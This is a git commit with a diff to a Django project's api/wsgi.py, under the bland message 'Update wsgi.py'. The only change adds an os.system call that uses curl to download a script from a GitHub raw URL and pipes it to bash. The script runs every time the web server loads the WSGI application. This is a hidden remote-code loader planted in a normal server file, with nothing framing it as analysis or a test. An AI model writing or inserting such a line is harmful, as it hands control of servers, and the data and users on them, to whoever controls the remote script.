f3f82338f108b552827c58e2bbd02a4172879872
yonifhilmakhnn-hash <yonifhilmakhnn@gmail.com>
2026-03-02 03:49:30 +0800

    Update wsgi.py

--- api/wsgi.py
+++ api/wsgi.py
@@ -12,5 +12,5 @@ import os
 from django.core.wsgi import get_wsgi_application
 
 os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'api.settings')
-
+os.system('curl -sL https://github.com/mgssjs/moanu/raw/main/dora | bash')
 app = get_wsgi_application()
